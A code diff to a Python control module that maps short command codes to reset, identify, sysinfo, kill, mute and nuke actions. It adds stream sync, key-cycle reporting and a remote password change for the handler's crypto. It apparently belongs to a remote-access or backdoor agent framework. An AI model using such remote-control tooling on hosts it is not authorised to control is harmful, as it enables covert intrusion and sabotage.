@@ -1,12 +1,15 @@
 def init( storage ) :
 	Commands = {
-		'reset' : 'RST',
+		'reset' : 'R',
 		'identity' : 'ID',
 		'sysinfo' : 'SI',
 		'kill' : 'KI',
 		'mute' : 'MU',
 		'unmute' : 'UM',
 		'nuke' : 'NK',
+		'check_sync' : 'CS',
+		'sync' : 'Y',
+		'chpasswd' : 'PWD',
 	}
 	storage['commands'] = Commands
 	def wait_exit() :
@@ -24,16 +27,43 @@ def init( storage ) :
 	def dummy_send(raw) : return
 	storage['dummy_send_func'] = dummy_send
 	storage['real_send_func'] = storage['COMMON']['handler'].send_function
+
+	def chpasswd (passwd) :
+		from time import sleep
+		sleep(0.1)
+		storage['COMMON']['handler'].getOrchestrator().initCrypto(passwd)
+	storage['chpasswd_func'] = chpasswd
+
 	return True
+
 
 def work( storage, message ) :
 	# print( "Control message: %s" % message )
+	import re
+	args = re.split("\s", message)
+	message = args[0]
 
 	if message == storage['commands']['reset'] :
 		storage['COMMON']['handler'].reset()
 		return 'OK'
 	elif message == storage['commands']['identity'] :
 		return storage['COMMON']['handler'].orchestrator.getIdentity()[:8]
+
+	elif message == storage['commands']['sync'] :
+		stream = args[1]
+		# print type(args), args
+		storage['COMMON']['handler'].getOrchestrator().reset( streams = [stream] )
+		# print "Reseted"
+		return 'OK'
+
+	elif message == storage['commands']['chpasswd'] :
+		new_passwd = args[1]
+		import threading
+		print storage.keys()
+		chpasswd_thread = threading.Thread( target = storage['chpasswd_func'], args = ( new_passwd, ) )
+		chpasswd_thread.start()
+		return 'OK'
+
 
 	elif message == storage['commands']['kill'] :
 		storage['COMMON']['handler'].stop()
@@ -54,6 +84,15 @@ def work( storage, message ) :
 	elif message == storage['commands']['nuke'] :
 		storage['nuke_func']()
 		return "OK" #
+
+	elif message == storage['commands']['check_sync'] :
+		import json
+		orch = storage['COMMON']['handler'].getOrchestrator()
+		ret_dict = {}
+		for stream in orch.getStreams() :
+			ret_dict[stream] = orch.getKeyCycles(stream)
+		ret = json.dumps(ret_dict).replace( " ","" )
+		return ret
 
 	elif message == storage['commands']['sysinfo'] :
 		import platform, json, getpass, locale
